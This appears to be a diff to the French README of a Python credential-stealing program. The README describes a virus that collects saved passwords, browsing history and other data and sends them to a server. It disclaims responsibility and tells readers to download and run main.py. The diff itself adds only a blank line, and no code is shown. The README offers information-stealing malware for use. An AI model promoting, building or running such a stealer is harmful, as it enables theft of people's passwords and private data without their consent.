@@ -1,6 +1,7 @@
 # Un stealer !!!
 Mon programme Python est un virus qui récupère toutes les données (mots de passe enregistrés, sites, historique et bien plus) et les transfère vers un serveur.
 - Je ne serai pas responsable de ce que vous ferez de mon code.
+
 Téléchargez les codes et exécutez "main.py", vous verrez le résultat ;)
 
 # J'ai utiliser ces deux codes :
